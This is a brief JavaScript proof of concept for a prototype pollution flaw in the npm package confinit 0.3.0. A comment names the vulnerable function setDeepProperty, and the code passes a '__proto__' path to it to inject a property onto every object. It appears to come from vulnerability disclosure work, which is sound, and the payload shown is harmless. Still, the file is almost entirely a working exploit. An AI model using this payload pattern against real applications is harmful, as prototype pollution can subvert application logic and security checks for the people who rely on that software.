/**
 * confinit@0.3.0 is vulnerable to prototype pollution.
 * the pollution  point is located in function setDeepProperty(obj, propertyPath, value)
 * in index.js. 
 */


var root = require("confinit");
var payload = "__proto__.jhu"
root.setDeepProperty({},payload,true);
console.log({}.jhu);
